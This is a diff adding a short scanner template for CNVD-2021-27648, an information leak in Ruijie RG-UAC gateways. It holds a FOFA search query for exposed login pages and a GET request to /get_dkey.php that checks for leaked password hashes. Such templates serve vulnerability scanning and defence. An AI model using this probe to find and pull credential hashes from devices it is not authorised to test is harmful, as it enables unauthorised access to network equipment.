@@ -1,0 +1,19 @@
+id: CNVD-2021-27648
+
+info:
+    name: Ruijie RG-UAC Information Leakage Vulnerability
+    author: doinb1517(https://github.com/Double-q1015/)
+    severity: critical
+    description: |
+        fofa-query: 'title="RG-UAC登录页面"'
+        RUIJIE RG-UAC信息泄露
+    reference:
+      - https://www.cnvd.org.cn/flaw/show/CNVD-2021-27648
+
+rules:
+    r0:
+      request:
+          method: GET
+          path: /get_dkey.php
+      expression: response.status == 200 && response.body.bcontains(b"password") && "\"[a-f0-9]{32}\"".bmatches(response.body)
+expression: r0()
